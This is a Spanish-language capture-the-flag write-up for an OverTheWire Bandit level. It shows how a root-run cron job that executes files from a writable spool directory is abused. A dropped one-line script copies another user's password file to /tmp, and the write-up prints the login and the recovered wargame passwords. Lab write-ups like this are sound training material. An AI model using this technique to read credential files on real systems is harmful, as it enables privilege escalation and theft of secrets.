## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Un programa se ejecuta automáticamente a intervalos regulares desde **cron**, el programador de trabajos basado en el tiempo. Busque en **/etc/cron.d/** la configuración y vea qué comando se está ejecutando.

**NOTA:** Este nivel requiere que crees tu propio primer script de shell. ¡Este es un gran paso y deberías estar orgulloso de ti mismo cuando superes este nivel!

**NOTA 2:** Tenga en cuenta que su script de shell se elimina una vez ejecutado, por lo que es posible que desee conservar una copia...
## Datos de usuario
Usuario: ssh bandit23@bandit.labs.overthewire.org -p 2220
Contraseña: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solución 
1.- Para poder solucionar este nivel primero empece con indagar sobre que hay dentro como en nivel anterior ingresando comando:
`cd /etc/cron.d`
Para previamente hacer lo siguiente: 
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir


2.- Aplicamos entonces el siguiente comando: 
cat /etc/cron.d/cronjob_bandit24`
Esto para poder ver que es lo que hay dentro de nuestro archivo

`bandit23@bandit:/etc/cron.d$ cat /etc/cron.d/cronjob_bandit24`
`@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null`
* `* * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null`
`bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh`
`#!/bin/bash`

`myname=$(whoami)`

`cd /var/spool/$myname/foo`
`echo "Executing and deleting all scripts in /var/spool/$myname/foo:"`
`for i in * .*;`
`do`
    `if [ "$i" != "." -a "$i" != ".." ];`
    `then`
        `echo "Handling $i"`
        `owner="$(stat --format "%U" ./$i)"`
        `if [ "${owner}" = "bandit23" ]; then`
            `timeout -s 9 60 ./$i`
        `fi`
        `rm -f ./$i`
    `fi`
`done`
El cual nos arroja el siguiente comando como pista:
`cd /var/spool/$myname/foo`
3.- Finalmente aplicamos los siguientes comandos para poder crear el script temporal y ejecutarlo, para que nos de la contraseña: 
En esta linea se hace cambio de directorio para poder ver hacia que ruta vamos:
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo

Esta linea la use como referencia que nos da al ejecutar un comando anterior la cual es la siguiente:
`echo "Executing and deleting all scripts in /var/spool/$myname/foo:"`

`bandit23@bandit:/var/spool/bandit24/foo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit24_test.txt" >bandit24.sh`
Cabe recalcar que solo sustituí los datos como se observa


Finalmente, aplicamos los permisos para poder ejecutar nuestro scrpit y así obtener la contraseña como se muestra a continuación: 
`bandit23@bandit:/var/spool/bandit24/foo$  chmod 777 bandit24.sh`
`bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/bandit24_test.txt``
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Contraseña obtenida en este nivel 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Notas 
En este nivel pude desarrollar la habilidad de poder crear scripts y mediante el comando chmod (num de instrucción que se desea ejectuar) pude realizar el darle los permisos necesarios al usuario para poder ejecutar sin problemas nuestro scritp y así poder acceder al siguiente nivel sin ningún problema. Por ejemplo investigando aprendí que en Chmod el número 7 nos permite lectura, escritura y ejecución de nuestro script de ahí viene la linea :`chmod 777 bandit24.sh`
ya que está linea nos permitió ejecutar el script y así obtener la contraseña.
## Referencias 
https://www.ionos.mx/digitalguide/servidores/know-how/asignacion-de-permisos-de-acceso-con-chmod/
https://www.howtogeek.com/437958/how-to-use-the-chmod-command-on-linux/
https://gospelidea.com/blog/que-son-los-permisos-chmod#:~:text=Los%20permisos%20CHMOD%20a%20trav%C3%A9s,incluye%20servidores%20dedicados%20o%20VPS.

